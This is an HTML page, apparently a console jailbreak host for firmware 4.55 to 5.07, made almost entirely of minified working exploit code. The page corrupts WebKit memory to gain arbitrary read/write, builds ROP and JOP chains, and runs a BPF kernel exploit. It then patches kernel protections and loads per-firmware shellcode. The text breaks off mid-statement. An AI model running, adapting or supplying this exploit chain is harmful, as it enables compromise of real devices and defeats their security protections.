<!doctypehtml><title>Kernel Clock (4.55-5.07)</title><meta content="width=device-width,initial-scale=1"name=viewport><style>.loader{position:absolute;left:50%;top:50%;margin:-75px 0 0 -75px;border:10px solid #f3f3f3;border-radius:50%;border-top:10px solid #044595;border-left:10px solid #044595;width:120px;height:120px;-webkit-animation:spin 1s linear infinite}.info{overflow:hidden;position:fixed;position:absolute;top:50%;left:50%;font-size:45px;font-family:sans-serif;transform:translate(-50%,-50%)}.credits{overflow:hidden;position:fixed;position:absolute;top:90%;left:50%;font-size:16px;font-family:sans-serif;text-align:center;transform:translate(-50%,-90%)}@-webkit-keyframes spin{0%{-webkit-transform:rotate(0)}100%{-webkit-transform:rotate(360deg)}}</style><body style=margin:0><script>function iframeMessage(s){try{window.self!==window.top&&parent.exploitDone(s)}catch(a){parent.exploitDone(s)}}function getParameterByName(s,a){var p=new RegExp("[#?&]"+s.replace(/[\[\]]/g,"\\$&")+"(=([^&#]*)|&|#|$)"),d=p.exec(a?a:window.location.href);return d?d[2]?decodeURIComponent(d[2].replace(/\+/g," ")):"":void 0}window.onerror=function(s){"Error:"==s.slice(0,6)&&fail(s)},window.didload=0,window.didpost=0,window.payloadPatch={};function executeExploit(s){var a={};try{a=JSON.parse(s)}catch(s){}if("payloadParams"in a)for(var p in a.payloadParams)window.payloadPatch[parseInt(p)]=a.payloadParams[p];setTimeout(window.stage2,1500)}window.onload=function(){window.didload=1,1==window.didpost&&(getParameterByName("params")?executeExploit(getParameterByName("params")):executeExploit("{}"))},window.postExpl=function(){window.didpost=1,1==window.didload&&setTimeout(window.stage2,1500)};function allset(){iframeMessage("Success!"),document.getElementById("loader").style.display="none",document.getElementById("allset").style.display="block"}function awaitpl(){var s=new XMLHttpRequest;s.open("GET","./success",!0),s.send(),iframeMessage("Awaiting Payload..."),document.getElementById("loader").style.display="none",document.getElementById("awaiting").style.display="block"}function fail(s){iframeMessage(s),document.getElementById("allset").style.display="none",document.getElementById("awaiting").style.display="none",document.getElementById("loader").style.display="none",document.getElementById("fail").innerText=s,document.getElementById("fail").style.display="block"}function malloc(s){var a=new Uint8Array(65536+s);window.nogc.push(a);var d=p.read8(p.leakval(a).add32(16));return d.backing=a,d}function mallocu32(s){var a=new Uint8Array(65536+4*s);window.nogc.push(a);var d=p.read8(p.leakval(a).add32(16));return d.backing=new Uint32Array(a.buffer),d}function stringify(s){for(var a=new Uint8Array(s.length+1),d=0;d<s.length;d++)a[d]=255&s.charCodeAt(d);return window.nogc.push(a),p.read8(p.leakval(a).add32(16))}var krop=function(s,a){return this.stackBase=a,this.stackPointer=0,this.push=function(a){s.write8(this.stackBase.add32(this.stackPointer),a),this.stackPointer+=8},this.write64=function(s,a){this.push(window.gadgets["pop rdi"]),this.push(s),this.push(window.gadgets["pop rax"]),this.push(a),this.push(window.gadgets["mov [rdi], rax"])},this};window.rop=function(){return this.stack=new Uint32Array(65536),this.stackBase=p.read8(p.leakval(this.stack).add32(16)),this.count=0,this.clear=function(){this.count=0,this.runtime=void 0;for(var s=0;2040>s;s++)p.write8(this.stackBase.add32(8*s),0)},this.pushSymbolic=function(){return this.count++,this.count-1},this.finalizeSymbolic=function(s,a){p.write8(this.stackBase.add32(8*s),a)},this.push=function(s){this.finalizeSymbolic(this.pushSymbolic(),s)},this.push_write8=function(s,a){this.push(gadgets["pop rdi"]),this.push(s),this.push(gadgets["pop rsi"]),this.push(a),this.push(gadgets["mov [rdi], rsi"])},this.fcall=function(s,a,p,d,r,e,g){return null!=a&&(this.push(gadgets["pop rdi"]),this.push(a)),null!=p&&(this.push(gadgets["pop rsi"]),this.push(p)),null!=d&&(this.push(gadgets["pop rdx"]),this.push(d)),null!=r&&(this.push(gadgets["pop rcx"]),this.push(r)),null!=e&&(this.push(gadgets["pop r8"]),this.push(e)),null!=g&&(this.push(gadgets["pop r9"]),this.push(g)),this.push(s),this},this.run=function(){var s=p.loadchain(this,this.notimes);return this.clear(),s},this};function makeid(){for(var s="",a="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789",p=0;8>p;p++)s+=a.charAt(Math.floor(Math.random()*a.length));return s}function zeroFill(s,a){return a-=s.toString().length,0<a?Array(a+(/\./.test(s)?2:1)).join("0")+s:s+""}for(var instancespr=[],i=0;4096>i;i++)instancespr[i]=new Uint32Array(1),instancespr[i][makeid()]=50057;var _dview;function u2d(s,a){return _dview||(_dview=new DataView(new ArrayBuffer(16))),_dview.setUint32(0,a),_dview.setUint32(4,s),_dview.getFloat64(0)}var dgc=function(){for(var s=0;256>s;s++)new ArrayBuffer(1048576)};function int64(s,a){return this.low=s>>>0,this.hi=a>>>0,this.add32inplace=function(s){var a=(4294967295&(this.low>>>0)+s)>>>0,p=this.hi>>>0;a<this.low&&p++,this.hi=p,this.low=a},this.add32=function(s){var a=(4294967295&(this.low>>>0)+s)>>>0,p=this.hi>>>0;return a<this.low&&p++,new int64(a,p)},this.sub32=function(s){var a=(4294967295&(this.low>>>0)-s)>>>0,p=this.hi>>>0;return 4294967295&a>this.low&&p--,new int64(a,p)},this.sub32inplace=function(s){var a=(4294967295&(this.low>>>0)-s)>>>0,p=this.hi>>>0;4294967295&a>this.low&&p--,this.hi=p,this.low=a},this.and32=function(s){var a=this.low&s,p=this.hi;return new int64(a,p)},this.and64=function(s,a){var p=this.low&s,d=this.hi&a;return new int64(p,d)},this.toString=function(s){s=16;var a=(this.low>>>0).toString(s),p=(this.hi>>>0).toString(s);return 0==this.hi?a:(a=zeroFill(a,8),p+a)},this.toPacked=function(){return{hi:this.hi,low:this.low}},this.setPacked=function(s){return this.hi=s.hi,this.low=s.low,this},this}var nogc=[],tgt={a:0,b:0,c:0,d:0},y=new ImageData(1,16384);postMessage("","*",[y.data.buffer]);for(var props={},i=0;i<8192;)props[i++]={value:1111638594},props[i++]={value:tgt};for(var foundLeak=void 0,foundIndex=0,maxCount=256;foundLeak==null&&0<maxCount;){maxCount--,history.pushState(y,""),Object.defineProperties({},props);try{var leak=new Uint32Array(history.state.data.buffer)}catch(s){throw fail("Failed to find leak!"),new Error("Failed to find leak!")}for(var i=0;i<leak.length-6;i++)if(1111638594==leak[i]&&4294901760==leak[i+1]&&0==leak[i+2]&&0==leak[i+3]&&0==leak[i+4]&&0==leak[i+5]&&14==leak[i+6]&&0==leak[i+7]&&0==leak[i+10]&&0==leak[i+11]&&0==leak[i+12]&&0==leak[i+13]&&14==leak[i+14]&&0==leak[i+15]){foundIndex=i,foundLeak=leak;break}}if(!foundLeak)throw new Error("Failed to find leak!");var firstLeak=Array.prototype.slice.call(foundLeak,foundIndex,foundIndex+64),leakJSVal=new int64(firstLeak[8],firstLeak[9]);Array.prototype.__defineGetter__(100,()=>1);var f=document.body.appendChild(document.createElement("iframe")),a=new f.contentWindow.Array(13.37,13.37),b=new f.contentWindow.Array(u2d(leakJSVal.low+16,leakJSVal.hi),13.37),master=new Uint32Array(4096),slave=new Uint32Array(4096),leakval_u32=new Uint32Array(4096),leakval_helper=[slave,2,3,4,5,6,7,8,9,10];tgt.a=u2d(2048,23077632),tgt.b=0,tgt.c=leakval_helper,tgt.d=4919;var c=Array.prototype.concat.call(a,b);document.body.removeChild(f);var hax=c[0];c[0]=0,tgt.c=c,hax[2]=0,hax[3]=0,Object.defineProperty(Array.prototype,100,{get:void 0}),tgt.c=leakval_helper;var butterfly=new int64(hax[2],hax[3]);butterfly.low+=16,tgt.c=leakval_u32;var lkv_u32_old=new int64(hax[4],hax[5]);hax[4]=butterfly.low,hax[5]=butterfly.hi,tgt.c=master,hax[4]=leakval_u32[0],hax[5]=leakval_u32[1];var addr_to_slavebuf=new int64(master[4],master[5]);tgt.c=leakval_u32,hax[4]=lkv_u32_old.low,hax[5]=lkv_u32_old.hi,tgt.c=0,hax=0;var prim={write8:function(s,a){master[4]=s.low,master[5]=s.hi,a instanceof int64?(slave[0]=a.low,slave[1]=a.hi):(slave[0]=a,slave[1]=0),master[4]=addr_to_slavebuf.low,master[5]=addr_to_slavebuf.hi},write4:function(s,a){master[4]=s.low,master[5]=s.hi,slave[0]=a,master[4]=addr_to_slavebuf.low,master[5]=addr_to_slavebuf.hi},read8:function(s){master[4]=s.low,master[5]=s.hi;var a=new int64(slave[0],slave[1]);return master[4]=addr_to_slavebuf.low,master[5]=addr_to_slavebuf.hi,a},read4:function(s){master[4]=s.low,master[5]=s.hi;var a=slave[0];return master[4]=addr_to_slavebuf.low,master[5]=addr_to_slavebuf.hi,a},leakval:function(s){leakval_helper[0]=s;var a=this.read8(butterfly);return this.write8(butterfly,new int64(1094795585,4294901760)),a},createval:function(s){this.write8(butterfly,s);var a=leakval_helper[0];return this.write8(butterfly,new int64(1094795585,4294901760)),a}};window.primitives=prim,window.postExpl&&window.postExpl();function kernExploit(){try{var s=p.syscall(5,p.stringify("/dev/bpf0"),2).low;if(4294967295==s)throw new Error("Failed to open first bpf device!");var a=p.syscall(5,p.stringify("/dev/bpf0"),2).low,d=p.malloc32(16384),r=p.malloc32(16384),e=d.backing,g=p.malloc(64);p.write8(g,256),p.write8(g.add32(8),d);var t=p.malloc(64);p.write8(t,256),p.write8(t.add32(8),r);for(var o=0;1024>o;)e[o++]=6,e[o++]=0;var h=p.syscall(54,s,2148549243,g);if(0!=h.low)throw new Error("Failed to open first bpf device!");var u,x,l=function(s,a){var d=p.malloc32(8192),r=d.backing;r[0]=1337;var e=new rop;e.push(window.gadgets.ret),e.push(window.gadgets.ret),e.push(window.gadgets.ret),e.push(window.gadgets.ret),a(e),p.write8(d,window.gadgets.ret),p.write8(d.add32(16),e.stackBase),p.syscall(324,1);var g=function(){p.fcall(window.gadgets.createThread,window.gadgets.longjmp,d,p.stringify(s))};return window.nogc.push(d),window.nogc.push(e),g},c=p.syscall(97,2,2),m=l("GottaGoFast",function(a){u=a.stackBase,a.push(window.gadgets.ret),a.push(window.gadgets.ret),a.push(window.gadgets.ret),a.push(window.gadgets["pop rdi"]),a.push(s),a.push(window.gadgets["pop rsi"]),a.push(2148549243),a.push(window.gadgets["pop rdx"]),a.push(g),a.push(window.gadgets["pop rsp"]),a.push(a.stackBase.add32(2048)),a.count=256;var p=a.count;a.push(window.syscalls[54]),a.push_write8(a.stackBase.add32(8*p),window.syscalls[54]),a.push(window.gadgets["pop rdi"]);var d=a.pushSymbolic();a.push(window.gadgets["pop rsi"]);var r=a.pushSymbolic();a.push(window.gadgets["mov [rdi], rsi"]),a.push(window.gadgets["pop rsp"]),x=a.stackBase.add32(8*a.count),a.push(1094795585),a.finalizeSymbolic(d,x),a.finalizeSymbolic(r,x.sub32(8))}),n=new rop,v=p.malloc32(4096),f=p.malloc32(4096),w=p.malloc32(4096),y=p.malloc32(4096),k=function(s,a){n.push(window.gadgets["pop rax"]),n.push(v),n.push(window.gadgets["mov rax, [rax]"]),n.push(window.gadgets["pop rsi"]),n.push(s),n.push(window.gadgets["add rax, rsi"]),n.push(window.gadgets["pop rsi"]),n.push(a),n.push(window.gadgets["mov [rax], rsi"])},b=function(s,a){n.push(window.gadgets["pop rax"]),n.push(v),n.push(window.gadgets["mov rax, [rax]"]),n.push(window.gadgets["pop rsi"]),n.push(s),n.push(window.gadgets["add rax, rsi"]),n.push(window.gadgets["mov rdi, rax"]),n.push(window.gadgets["pop rax"]),n.push(v),n.push(window.gadgets["mov rax, [rax]"]),n.push(window.gadgets["pop rsi"]),n.push(a),n.push(window.gadgets["add rax, rsi"]),n.push(window.gadgets["mov [rdi], rax"])},j=0;p.write8(r.add32(16),f),p.write8(f.add32(80),0),p.write8(f.add32(104),w),p.write8(w.add32(16),window.gadgets.jop1),j+=8+window.gadgets_shift.stackshift_jop1,p.write8(f.add32(0),y),p.write8(f.add32(16),y.add32(8)),p.write8(y.add32(2e3),window.gadgets.jop2);for(var _=y,o=0;15>o;o++)p.write8(_,window.gadgets.jop1),j+=8+window.gadgets_shift.stackshift_jop1,p.write8(_.add32(2032),window.gadgets.jop2),p.write8(_.add32(8),_.add32(32)),p.write8(_.add32(24),_.add32(40)),_=_.add32(32);var B=_,P=_.add32(8),E=get_jmptgt(webKitBase.add32(248));E=p.read8(E),p.write8(B,window.gadgets.jop3),j+=8,p.write8(P.add32(112),window.gadgets.jop4),j+=8,p.write8(P.add32(24),P),p.write8(P.add32(8),n.stackBase),p.write8(B.add32(48),window.gadgets["jop_mov rbp, rsp"]),p.write8(P,B),p.write8(B.add32(1056),window.gadgets.jop6),j+=window.gadgets_shift.stackshift_jop6;var S=j;p.write8(B.add32(64),E.add32(50)),p.write8(P.add32(176),S);for(var o=0;512>o;o++)p.write8(n.stackBase.add32(8*o),window.gadgets.ret);n.count=16,p.write8(v.add32(1056),window.gadgets["pop rdi"]),p.write8(v.add32(64),window.gadgets["pop rax"]),p.write8(v.add32(24),v),n.push(window.gadgets["pop rdi"]),n.push(v.add32(24)),n.push(window.gadgets["jop_mov rbp, rsp"]);var I=S-8*n.count;if(n.push(window.gadgets.jop6),I+=window.gadgets_shift.stackshift_jop6,n.push(window.gadgets["pop rax"]),n.push(I),n.push(window.gadgets["add rdi, rax"]),"5.01"==fwFromUA){n.push(window.gadgets["mov rax, [rdi]"]),n.push(window.gadgets["pop rsi"]),n.push(762),n.push(window.gadgets["add rax, rsi"]),n.push(window.gadgets["mov [rdi], rax"]),n.push(window.gadgets["pop rdi"]),n.push(v),n.push(window.gadgets["mov [rdi], rax"]),n.push(window.gadgets["pop rsi"]),n.push(808116),n.push(window.gadgets["add rax, rsi"]),n.push(window.gadgets["pop rdi"]),n.push(v.add32(8)),n.push(window.gadgets["mov [rdi], rax"]),n.push(window.gadgets["jmp rax"]),n.push(window.gadgets["pop rdi"]),n.push(v.add32(16)),n.push(window.gadgets["mov [rdi], rax"]),n.push(window.gadgets["pop rsi"]),n.push(new int64(4294901759,4294967295)),n.push(window.gadgets["and rax, rsi"]),n.push(window.gadgets["mov rdx, rax"]),n.push(window.gadgets["pop rax"]),n.push(v.add32(8)),n.push(window.gadgets["mov rax, [rax]"]),n.push(window.gadgets["pop rsi"]),n.push(9),n.push(window.gadgets["add rax, rsi"]),n.push(window.gadgets["mov rdi, rax"]),n.push(window.gadgets["mov rax, rdx"]),n.push(window.gadgets["jmp rdi"]),n.push(window.gadgets["pop rax"]),n.push(v),n.push(window.gadgets["mov rax, [rax]"]),n.push(window.gadgets["pop rsi"]),n.push(221338),n.push(window.gadgets["add rax, rsi"]),n.push(window.gadgets["mov rax, [rax]"]),n.push(window.gadgets["pop rdi"]),n.push(v.add32(816)),n.push(window.gadgets["mov [rdi], rax"]),patch_mprotect=new int64(2425420344,2425393296),k(221338,patch_mprotect);var A=new int64(4293816342,4294967295),F=new int64(184,3297329408);k(A,F);var T=new int64(4293470775,4294967295),O=new int64(4293470805,4294967295),C=new int64(0,1082624841),U=new int64(2425388523,1922076816);k(T,C),k(O,U);var L=new int64(4294769332,4294967295),G=new int64(934690871,826654769);k(L,G);var K=new int64(233,2336788480),z=new int64(2428747825,2425393296);k(828366,K),k(1329396,z);var R=new int64(15789508,0),D=new int64(15789516,0),W=new int64(4293548548,4294967295),$=new int64(15789548,0),V=new int64(2,0),Q=new int64(0,1);k(R,V),b(D,W),k($,Q),n.push(window.gadgets["pop rax"]),n.push(v.add32(8)),n.push(window.gadgets["mov rax, [rax]"]),n.push(window.gadgets["pop rsi"]),n.push(9),n.push(window.gadgets["add rax, rsi"]),n.push(window.gadgets["mov rdi, rax"]),n.push(window.gadgets["pop rax"]),n.push(v.add32(16)),n.push(window.gadgets["mov rax, [rax]"]),n.push(window.gadgets["jmp rdi"])}else if("5.05"==fwFromUA){n.push(window.gadgets["mov rax, [rdi]"]),n.push(window.gadgets["pop rsi"]),n.push(762),n.push(window.gadgets["add rax, rsi"]),n.push(window.gadgets["mov [rdi], rax"]),n.push(window.gadgets["pop rdi"]),n.push(v),n.push(window.gadgets["mov [rdi], rax"]),n.push(window.gadgets["pop rsi"]),n.push(808116),n.push(window.gadgets["add rax, rsi"]),n.push(window.gadgets["pop rdi"]),n.push(v.add32(8)),n.push(window.gadgets["mov [rdi], rax"]),n.push(window.gadgets["jmp rax"]),n.push(window.gadgets["pop rdi"]),n.push(v.add32(16)),n.push(window.gadgets["mov [rdi], rax"]),n.push(window.gadgets["pop rsi"]),n.push(new int64(4294901759,4294967295)),n.push(window.gadgets["and rax, rsi"]),n.push(window.gadgets["mov rdx, rax"]),n.push(window.gadgets["pop rax"]),n.push(v.add32(8)),n.push(window.gadgets["mov rax, [rax]"]),n.push(window.gadgets["pop rsi"]),n.push(9),n.push(window.gadgets["add rax, rsi"]),n.push(window.gadgets["mov rdi, rax"]),n.push(window.gadgets["mov rax, rdx"]),n.push(window.gadgets["jmp rdi"]),n.push(window.gadgets["pop rax"]),n.push(v),n.push(window.gadgets["mov rax, [rax]"]),n.push(window.gadgets["pop rsi"]),n.push(221338),n.push(window.gadgets["add rax, rsi"]),n.push(window.gadgets["mov rax, [rax]"]),n.push(window.gadgets["pop rdi"]),n.push(v.add32(816)),n.push(window.gadgets["mov [rdi], rax"]),patch_mprotect=new int64(2425420344,2425393296),k(221338,patch_mprotect);var A=new int64(4293816070,4294967295),F=new int64(184,3297329408);k(A,F);var T=new int64(4293470503,4294967295),O=new int64(4293470533,4294967295),C=new int64(0,1082624841),U=new int64(2425388523,1922076816);k(T,C),k(O,U);var L=new int64(4294769332,4294967295),G=new int64(934690871,826654769);k(L,G);var K=new int64(115177,2336788480),z=new int64(2428747825,2425393296);k(828366,K),k(1329844,z);var R=new int64(15789236,0),D=new int64(15789244,0),W=new int64(4293548276,4294967295),$=new int64(15789276,0),V=new int64(2,0),Q=new int64(0,1);k(R,V),b(D,W),k($,Q),n.push(window.gadgets["pop rax"]),n.push(v.add32(8)),n.push(window.gadgets["mov rax, [rax]"]),n.push(window.gadgets["pop rsi"]),n.push(9),n.push(window.gadgets["add rax, rsi"]),n.push(window.gadgets["mov rdi, rax"]),n.push(window.gadgets["pop rax"]),n.push(v.add32(16)),n.push(window.gadgets["mov rax, [rax]"]),n.push(window.gadgets["jmp rdi"])}else if("4.74"==fwFromUA){n.push(window.gadgets["mov rax, [rdi]"]),n.push(window.gadgets["pop rcx"]),n.push(1984672),n.push(window.gadgets["sub rax, rcx"]),n.push(window.gadgets["mov rdx, rax"]),n.push(window.gadgets["pop rsi"]),n.push(v.add32(144)),n.push(window.gadgets["mov [rsi], rdx"]),n.push(window.gadgets["pop rax"]),n.push(window.gadgets.test),n.push(window.gadgets["mov [rdi], rax"]),n.push(window.gadgets["pop rax"]),n.push(v.add32(144)),n.push(window.gadgets["mov rax, [rax]"]),n.push(window.gadgets["pop rcx"]),n.push(2634025),n.push(window.gadgets["add rax, rcx"]),n.push(window.gadgets["mov rdx, rax"]),n.push(window.gadgets["pop rax"]),n.push(2147745843),n.push(window.gadgets["jmp rdx_more"]);var q=new int64(184,3330883840);n.push(window.gadgets["pop rax"]),n.push(v.add32(144)),n.push(window.gadgets["mov rax, [rax]"]),n.push(window.gadgets["pop rcx"]),n.push(1129331),n.push(window.gadgets["add rax, rcx"]),n.push(window.gadgets["pop rsi"]),n.push(q),n.push(window.gadgets["mov [rax], rsi"]);var J=new int64(2425416248,2425393296);n.push(window.gadgets["pop rax"]),n.push(v.add32(144)),n.push(window.gadgets["mov rax, [rax]"]),n.push(window.gadgets["pop rcx"]),n.push(3766390),n.push(window.gadgets["add rax, rcx"]),n.push(window.gadgets["pop rsi"]),n.push(J),n.push(window.gadgets["mov [rax], rsi"]);var M=new int64(934691127,826654769);n.push(window.gadgets["pop rax"]),n.push(v.add32(144)),n.push(window.gadgets["mov rax, [rax]"]),n.push(window.gadgets["pop rcx"]),n.push(1315748),n.push(window.gadgets["add rax, rcx"]),n.push(window.gadgets["pop rsi"]),n.push(M),n.push(window.gadgets["mov [rax], rsi"]);var X=new int64(0,1082624841),Y=new int64(2425387499,1922076816);n.push(window.gadgets["pop rax"]),n.push(v.add32(144)),n.push(window.gadgets["mov rax, [rax]"]),n.push(window.gadgets["pop rcx"]),n.push(4052147),n.push(window.gadgets["add rax, rcx"]),n.push(window.gadgets["pop rsi"]),n.push(X),n.push(window.gadgets["mov [rax], rsi"]),n.push(window.gadgets["pop rax"]),n.push(v.add32(144)),n.push(window.gadgets["mov rax, [rax]"]),n.push(window.gadgets["pop rcx"]),n.push(4052177),n.push(window.gadgets["add rax, rcx"]),n.push(window.gadgets["pop rsi"]),n.push(Y),n.push(window.gadgets["mov [rax], rsi"]);var Z=new int64(217833,2336788480),H=new int64(2428747825,2425393296);n.push(window.gadgets["pop rax"]),n.push(v.add32(144)),n.push(window.gadgets["mov rax, [rax]"]),n.push(window.gadgets["pop rcx"]),n.push(3999150),n.push(window.gadgets["add rax, rcx"]),n.push(window.gadgets["pop rsi"]),n.push(Z),n.push(window.gadgets["mov [rax], rsi"]),n.push(window.gadgets["pop rax"]),n.push(v.add32(144)),n.push(window.gadgets["mov rax, [rax]"]),n.push(window.gadgets["pop rcx"]),n.push(427680),n.push(window.gadgets["add rax, rcx"]),n.push(window.gadgets["pop rsi"]),n.push(H),n.push(window.gadgets["mov [rax], rsi"]);var N=new int64(0,1);n.push(window.gadgets["pop rax"]),n.push(v.add32(144)),n.push(window.gadgets["mov rax, [rax]"]),n.push(window.gadgets["pop rcx"]),n.push(16992672),n.push(window.gadgets["add rax, rcx"]),n.push(window.gadgets["pop rsi"]),n.push(2),n.push(window.gadgets["mov [rax], rsi"]),n.push(window.gadgets["pop rsi"]),n.push(1284655),n.push(window.gadgets["pop rdi"]),n.push(v.add32(144)),n.push(window.gadgets["add rsi, [rdi]; mov rax, rsi"]),n.push(window.gadgets["pop rax"]),n.push(v.add32(144)),n.push(window.gadgets["mov rax, [rax]"]),n.push(window.gadgets["pop rcx"]),n.push(16992680),n.push(window.gadgets["add rax, rcx"]),n.push(window.gadgets["mov [rax], rsi"]),n.push(window.gadgets["pop rax"]),n.push(v.add32(144)),n.push(window.gadgets["mov rax, [rax]"]),n.push(window.gadgets["pop rcx"]),n.push(16992712),n.push(window.gadgets["add rax, rcx"]),n.push(window.gadgets["pop rsi"]),n.push(N),n.push(window.gadgets["mov [rax], rsi"]),n.push(window.gadgets["pop rax"]),n.push(v.add32(144)),n.push(window.gadgets["mov rax, [rax]"]),n.push(window.gadgets["pop rcx"]),n.push(2634016),n.push(window.gadgets["add rax, rcx"]),n.push(window.gadgets["jmp rax"]),n.push(window.gadgets["pop rdi"]),n.push(v),n.push(window.gadgets["mov [rdi], rax"])}else if("4.55"==fwFromUA){n.push(window.gadgets["mov rax, [rdi]"]),n.push(window.gadgets["pop rcx"]),n.push(1975872),n.push(window.gadgets["sub rax, rcx"]),n.push(window.gadgets["mov rdx, rax"]),n.push(window.gadgets["pop rsi"]),n.push(v.add32(144)),n.push(window.gadgets["mov [rsi], rdx"]),n.push(window.gadgets["pop rax"]),n.push(window.gadgets.test),n.push(window.gadgets["mov [rdi], rax"]),n.push(window.gadgets["pop rax"]),n.push(v.add32(144)),n.push(window.gadgets["mov rax, [rax]"]),n.push(window.gadgets["pop rcx"]),n.push(2625401),n.push(window.gadgets["add rax, rcx"]),n.push(window.gadgets["mov rdx, rax"]),n.push(window.gadgets["pop rax"]),n.push(2147745843),n.push(window.gadgets["jmp rdx_more"]);var q=new int64(184,3330883840);n.push(window.gadgets["pop rax"]),n.push(v.add32(144)),n.push(window.gadgets["mov rax, [rax]"]),n.push(window.gadgets["pop rcx"]),n.push(1131747),n.push(window.gadgets["add rax, rcx"]),n.push(window.gadgets["pop rsi"]),n.push(q),n.push(window.gadgets["mov [rax], rsi"]);var J=new int64(2425416248,2425393296);n.push(window.gadgets["pop rax"]),n.push(v.add32(144)),n.push(window.gadgets["mov rax, [rax]"]),n.push(window.gadgets["pop rcx"]),n.push(3762774),n.push(window.gadgets["add rax, rcx"]),n.push(window.gadgets["pop rsi"]),n.push(J),n.push(window.gadgets["mov [rax], rsi"]);var M=new int64(934691127,826654769);n.push(window.gadgets["pop rax"]),n.push(v.add32(144)),n.push(window.gadgets["mov rax, [rax]"]),n.push(window.gadgets["pop rcx"]),n.push(1318164),n.push(window.gadgets["add rax, rcx"]),n.push(window.gadgets["pop rsi"]),n.push(M),n.push(window.gadgets["mov [rax], rsi"]);var X=new int64(0,1082624841),Y=new int64(2425387499,1922076816);n.push(window.gadgets["pop rax"]),n.push(v.add32(144)),n.push(window.gadgets["mov rax, [rax]"]),n.push(window.gadgets["pop rcx"]),n.push(4048387),n.push(window.gadgets["add rax, rcx"]),n.push(window.gadgets["pop rsi"]),n.push(X),n.push(window.gadgets["mov [rax], rsi"]),n.push(window.gadgets["pop rax"]),n.push(v.add32(144)),n.push(window.gadgets["mov rax, [rax]"]),n.push(window.gadgets["pop rcx"]),n.push(4048417),n.push(window.gadgets["add rax, rcx"]),n.push(window.gadgets["pop rsi"]),n.push(Y),n.push(window.gadgets["mov [rax], rsi"]);var Z=new int64(217833,2336788480),H=new int64(2428747825,2425393296);n.push(window.gadgets["pop rax"]),n.push(v.add32(144)),n.push(window.gadgets["mov rax, [rax]"]),n.push(window.gadgets["pop rcx"]),n.push(3995390),n.push(window.gadgets["add rax, rcx"]),n.push(window.gadgets["pop rsi"]),n.push(Z),n.push(window.gadgets["mov [rax], rsi"]),n.push(window.gadgets["pop rax"]),n.push(v.add32(144)),n.push(window.gadgets["mov rax, [rax]"]),n.push(window.gadgets["pop rcx"]),n.push(430272),n.push(window.gadgets["add rax, rcx"]),n.push(window.gadgets["pop rsi"]),n.push(H),n.push(window.gadgets["mov [rax], rsi"]);var N=new int64(0,1);n.push(window.gadgets["pop rax"]),n.push(v.add32(144)),n.push(window.gadgets["mov rax, [rax]"]),n.push(window.gadgets["pop rcx"]),n.push(16955552),n.push(window.gadgets["add rax, rcx"]),n.push(window.gadgets["pop rsi"]),n.push(2),n.push(window.gadgets["mov [rax], rsi"]),n.push(window.gadgets["pop rsi"]),n.push(1287071),n.push(window.gadgets["pop rdi"]),n.push(v.add32(144)),n.push(window.gadgets["add rsi, [rdi]; mov rax, rsi"]),n.push(window.gadgets["pop rax"]),n.push(v.add32(144)),n.push(window.gadgets["mov rax, [rax]"]),n.push(window.gadgets["pop rcx"]),n.push(16955560),n.push(window.gadgets["add rax, rcx"]),n.push(window.gadgets["mov [rax], rsi"]),n.push(window.gadgets["pop rax"]),n.push(v.add32(144)),n.push(window.gadgets["mov rax, [rax]"]),n.push(window.gadgets["pop rcx"]),n.push(16955592),n.push(window.gadgets["add rax, rcx"]),n.push(window.gadgets["pop rsi"]),n.push(N),n.push(window.gadgets["mov [rax], rsi"]),n.push(window.gadgets["pop rax"]),n.push(v.add32(144)),n.push(window.gadgets["mov rax, [rax]"]),n.push(window.gadgets["pop rcx"]),n.push(2625392),n.push(window.gadgets["add rax, rcx"]),n.push(window.gadgets["jmp rax"]),n.push(window.gadgets["pop rdi"]),n.push(v),n.push(window.gadgets["mov [rdi], rax"])}n.push(window.gadgets.ret2userland),n.push(v.add32(4096));var ss=p.malloc32(16),as=p.malloc32(256);if(as.backing[0]=c,as.backing[2]=131071,as.backing[3]=1,as.backing[4]=5,"5.01"==fwFromUA)var ps=[35817,2425393152,2425393296,2425393296,8567125,2303246336,1096172005,1398030677,2303275535,3149957588,256,551862601,1220806985,9831821,2370371584,4265616532,2370699263,3749717172,2370633744,1521493164,2169045059,1265721540,277432321,4202255,698,3867757568,524479,3607052544,960335176,1207959552,3224487561,2211839809,3698655723,1103114587,1096630620,2428722526,1032669269,4294967160,2303260209,15293925,1207959552,770247,2303262720,3271888842,1818324331,979595116,628633632,1815490864,2648,0,0,0,0,0,0,0,0,0,0,0,0,0,0];else if("5.05"==fwFromUA)var ps=[35817,2425393152,2425393296,2425393296,8567125,2303246336,1096172005,1398030677,2303275535,3149957588,256,551862601,1220806985,9831821,2370371584,4265616532,2370699263,3767542964,2370633744,1585456300,2169045059,1265721540,277432321,4202255,698,3867757568,524479,3607052544,960335176,1207959552,3224487561,2211839809,3698655723,1103114587,1096630620,2428722526,1032669269,4294967160,2303260209,15293925,1207959552,770247,2303262720,3271888842,1818324331,979595116,628633632,1815490864,2648,0,0,0,0,0,0,0,0,0,0,0,0,0,0];else if("4.74"==fwFromUA)var ps=[35817,2425393152,2425393296,2425393296,8567125,2303246336,1096172005,1398030677,2303275535,3149957588,256,551862601,1220806985,9831821,2370371584,1211114644,2370699215,3455067316,2370633742,3344966828,2169110480,1711632580,277432321,4202255,698,3867757568,524479,3607052544,960335176,1207959552,3224487561,2211839809,3698655723,1103114587,1096630620,2428722526,1032669269,4294967160,2303260209,15293925,1207959552,770247,2303262720,3271888842,1818324331,979595116,628633632,1815490864,2648,0,0,0,0,0,0,0,0,0,0,0,0,0,0];else if("4.55"==fwFromUA)var ps=[35817,2425393152,2425393296,2425393296,8567125,2303246336,1096172005,1398030677,2303275535,3149957588,256,551862601,1220806985,9831821,2370371584,1781539988,2370699215,3783271604,2370633742,3915392172,2169110480,1705410756,277432321,4202255,698,3867757568,524479,3607052544,960335176,1207959552,3224487561,2211839809,3698655723,1103114587,1096630620,2428722526,1032669269,4294967160,2303260209,15293925,1207959552,770247,2303262720,3271888842,1818324331,979595116,628633632,1815490864,2648,0,0,0,0,0,0,0,0,0,0,0,0,0,0];for(var ds=p.malloc32(4096),o=0;o<ps.length;o++)ds.backing[o]=ps[o];var rs=new rop;for(m();;)if(rs.count=0,rs.push(window.syscalls[362]),rs.push(window.gadgets["pop rdi"]),rs.push(ss),rs.push(window.gadgets["mov [rdi], rax"]),rs.push(window.gadgets.ret),rs.push(window.gadgets.ret),rs.push(window.gadgets.ret),rs.push(window.gadgets.ret),rs.push_write8(x,u),rs.push(window.gadgets["pop 